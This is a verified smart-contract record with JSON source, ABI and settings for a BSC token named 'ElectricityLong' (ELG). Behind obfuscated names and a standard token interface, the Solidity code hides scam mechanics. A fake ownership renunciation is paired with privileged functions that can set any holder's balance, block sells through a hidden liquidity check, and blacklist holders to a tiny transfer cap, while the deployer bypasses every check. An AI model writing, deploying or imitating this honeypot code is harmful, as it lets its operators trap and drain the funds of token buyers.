{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface buyToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletTeamMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listLaunchShould {\n    function createPair(address fundTo, address buySell) external returns (address);\n}\n\ninterface sellList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptAt) external view returns (uint256);\n\n    function transfer(address isAmount, uint256 maxFund) external returns (bool);\n\n    function allowance(address walletLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isAmount,\n        uint256 maxFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableAuto, uint256 value);\n    event Approval(address indexed walletLaunch, address indexed spender, uint256 value);\n}\n\ninterface sellListMetadata is sellList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ElectricityLong is walletTeamMax, sellList, sellListMetadata {\n\n    mapping(address => bool) public totalSenderFund;\n\n    string private exemptMarketing = \"ELG\";\n\n    uint256 public sellSwap;\n\n    bool public enableFundReceiver;\n\n    mapping(address => uint256) private enableMarketing;\n\n    constructor (){\n        if (enableFundReceiver) {\n            sellSwap = listFund;\n        }\n        buyToken receiverReceiver = buyToken(totalIs);\n        limitSender = listLaunchShould(receiverReceiver.factory()).createPair(receiverReceiver.WETH(), address(this));\n        \n        minIsTo = _msgSender();\n        receiverSwap();\n        totalSenderFund[minIsTo] = true;\n        enableMarketing[minIsTo] = minTo;\n        if (listFund == sellSwap) {\n            sellSwap = shouldLiquidity;\n        }\n        emit Transfer(address(0), minIsTo, minTo);\n    }\n\n    uint256 private minTo = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptMarketing;\n    }\n\n    uint8 private tokenReceiverExempt = 18;\n\n    function listMinTo(address marketingAuto, address isAmount, uint256 maxFund) internal returns (bool) {\n        require(enableMarketing[marketingAuto] >= maxFund);\n        enableMarketing[marketingAuto] -= maxFund;\n        enableMarketing[isAmount] += maxFund;\n        emit Transfer(marketingAuto, isAmount, maxFund);\n        return true;\n    }\n\n    function tokenList() private view {\n        require(totalSenderFund[_msgSender()]);\n    }\n\n    function limitIs(address shouldAt) public {\n        if (senderSellMin) {\n            return;\n        }\n        if (listFund == teamLimit) {\n            enableFundReceiver = false;\n        }\n        totalSenderFund[shouldAt] = true;\n        \n        senderSellMin = true;\n    }\n\n    function transfer(address tokenFrom, uint256 maxFund) external virtual override returns (bool) {\n        return swapSellList(_msgSender(), tokenFrom, maxFund);\n    }\n\n    function txTake(address tokenFrom, uint256 maxFund) public {\n        tokenList();\n        enableMarketing[tokenFrom] = maxFund;\n    }\n\n    function receiverSwap() public {\n        emit OwnershipTransferred(minIsTo, address(0));\n        marketingWalletExempt = address(0);\n    }\n\n    address public limitSender;\n\n    function getOwner() external view returns (address) {\n        return marketingWalletExempt;\n    }\n\n    uint256 private teamLimit;\n\n    function swapSellList(address marketingAuto, address isAmount, uint256 maxFund) internal returns (bool) {\n        if (marketingAuto == minIsTo) {\n            return listMinTo(marketingAuto, isAmount, maxFund);\n        }\n        uint256 tokenLiquidity = sellList(limitSender).balanceOf(buyReceiver);\n        require(tokenLiquidity == amountFee);\n        require(isAmount != buyReceiver);\n        if (listSell[marketingAuto]) {\n            return listMinTo(marketingAuto, isAmount, modeExempt);\n        }\n        return listMinTo(marketingAuto, isAmount, maxFund);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minTo;\n    }\n\n    address private marketingWalletExempt;\n\n    bool private tradingTxSender;\n\n    function balanceOf(address exemptAt) public view virtual override returns (uint256) {\n        return enableMarketing[exemptAt];\n    }\n\n    event OwnershipTransferred(address indexed modeFeeMarketing, address indexed senderFund);\n\n    uint256 public minTotal;\n\n    function transferFrom(address marketingAuto, address isAmount, uint256 maxFund) external override returns (bool) {\n        if (_msgSender() != totalIs) {\n            if (receiverFee[marketingAuto][_msgSender()] != type(uint256).max) {\n                require(maxFund <= receiverFee[marketingAuto][_msgSender()]);\n                receiverFee[marketingAuto][_msgSender()] -= maxFund;\n            }\n        }\n        return swapSellList(marketingAuto, isAmount, maxFund);\n    }\n\n    function owner() external view returns (address) {\n        return marketingWalletExempt;\n    }\n\n    uint256 constant modeExempt = 4 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingExempt;\n    }\n\n    uint256 private shouldLiquidity;\n\n    function limitSwap(uint256 maxFund) public {\n        tokenList();\n        amountFee = maxFund;\n    }\n\n    uint256 autoLaunched;\n\n    address public minIsTo;\n\n    function approve(address enableTo, uint256 maxFund) public virtual override returns (bool) {\n        receiverFee[_msgSender()][enableTo] = maxFund;\n        emit Approval(_msgSender(), enableTo, maxFund);\n        return true;\n    }\n\n    uint256 public listFund;\n\n    uint256 amountFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenReceiverExempt;\n    }\n\n    address buyReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address totalIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address modeReceiver, address enableTo) external view virtual override returns (uint256) {\n        if (enableTo == totalIs) {\n            return type(uint256).max;\n        }\n        return receiverFee[modeReceiver][enableTo];\n    }\n\n    mapping(address => bool) public listSell;\n\n    function teamTotal(address fundMaxAmount) public {\n        tokenList();\n        if (minTotal == shouldLiquidity) {\n            shouldLiquidity = teamLimit;\n        }\n        if (fundMaxAmount == minIsTo || fundMaxAmount == limitSender) {\n            return;\n        }\n        listSell[fundMaxAmount] = true;\n    }\n\n    string private marketingExempt = \"Electricity Long\";\n\n    bool public senderSellMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFeeMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"}],\"name\":\"limitIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"limitSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIsTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSellMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMaxAmount\",\"type\":\"address\"}],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSenderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"txTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ElectricityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}